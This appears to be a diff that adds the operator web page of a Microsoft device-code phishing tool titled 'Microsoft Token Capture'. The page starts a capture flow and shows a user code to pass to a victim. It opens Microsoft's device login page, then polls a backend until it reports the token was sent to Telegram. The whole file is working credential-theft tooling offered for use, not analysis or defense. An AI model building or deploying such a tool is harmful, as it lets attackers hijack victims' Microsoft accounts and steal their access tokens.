@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Capture</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: system-ui, sans-serif; }
+        .code-box { font-family: monospace; letter-spacing: 6px; font-size: 2.5rem; }
+    </style>
+</head>
+<body class="bg-zinc-950 text-white min-h-screen flex items-center justify-center">
+    <div class="max-w-md w-full mx-auto p-6 text-center">
+        <h1 class="text-2xl font-bold mb-8">Microsoft Token Capture</h1>
+
+        <!-- Start Button -->
+        <div id="start-screen">
+            <button onclick="startCapture()" 
+                    class="w-full bg-blue-600 hover:bg-blue-700 py-6 rounded-3xl text-xl font-semibold transition-all">
+                Start New Capture
+            </button>
+        </div>
+
+        <!-- Code Display + Button -->
+        <div id="code-screen" class="hidden bg-zinc-900 rounded-3xl p-8 space-y-8">
+            <div>
+                <p class="text-zinc-400 text-sm mb-3">Enter this code on Microsoft</p>
+                <div id="user-code-display" 
+                     onclick="copyCode()"
+                     class="code-box bg-black border border-white/30 rounded-2xl py-8 cursor-pointer hover:border-blue-400 transition-colors">
+                    ••••••••
+                </div>
+            </div>
+
+            <button onclick="openMicrosoftLogin()" 
+                    class="w-full bg-white text-black py-5 rounded-3xl font-semibold flex items-center justify-center gap-3 hover:bg-gray-100 transition-all">
+                Open Microsoft Device Login
+                <span class="text-xl">→</span>
+            </button>
+
+            <p id="status-text" class="text-amber-400 text-sm font-medium">Waiting for authentication...</p>
+        </div>
+
+        <!-- Done Message (silent) -->
+        <div id="done-screen" class="hidden bg-emerald-900/30 border border-emerald-500/50 rounded-3xl p-8">
+            <p class="text-emerald-400 text-lg">Capture complete.<br>Token sent to Telegram.</p>
+            <button onclick="resetToStart()" 
+                    class="mt-6 w-full bg-zinc-800 hover:bg-zinc-700 py-4 rounded-3xl text-sm font-medium">
+                Start Another Capture
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let currentFlowId = null;
+
+        async function startCapture() {
+            // Hide start, show code screen
+            document.getElementById('start-screen').classList.add('hidden');
+            document.getElementById('code-screen').classList.remove('hidden');
+            document.getElementById('done-screen').classList.add('hidden');
+
+            const res = await fetch('/api/start', { method: 'POST' });
+            const data = await res.json();
+
+            if (!data.success) {
+                document.getElementById('status-text').innerHTML = `<span class="text-red-400">Config error</span>`;
+                return;
+            }
+
+            currentFlowId = data.flow_id;
+            document.getElementById('user-code-display').textContent = data.user_code;
+            document.getElementById('status-text').textContent = 'Waiting for sign-in...';
+
+            pollForToken();
+        }
+
+        function openMicrosoftLogin() {
+            window.open('https://microsoft.com/devicelogin', '_blank');
+        }
+
+        function copyCode() {
+            const code = document.getElementById('user-code-display').textContent;
+            navigator.clipboard.writeText(code);
+            const el = document.getElementById('user-code-display');
+            const original = el.textContent;
+            el.style.color = '#22c55e';
+            el.textContent = 'COPIED';
+            setTimeout(() => {
+                el.style.color = '';
+                el.textContent = original;
+            }, 1500);
+        }
+
+        async function pollForToken() {
+            if (!currentFlowId) return;
+
+            const poll = setInterval(async () => {
+                const res = await fetch(`/api/status/${currentFlowId}`);
+                const data = await res.json();
+
+                if (data.status === 'success') {
+                    clearInterval(poll);
+                    document.getElementById('code-screen').classList.add('hidden');
+                    document.getElementById('done-screen').classList.remove('hidden');
+                } 
+                else if (data.status === 'error') {
+                    clearInterval(poll);
+                    document.getElementById('status-text').innerHTML = `<span class="text-red-400">Error</span>`;
+                }
+            }, 4000);
+        }
+
+        function resetToStart() {
+            currentFlowId = null;
+            document.getElementById('done-screen').classList.add('hidden');
+            document.getElementById('start-screen').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
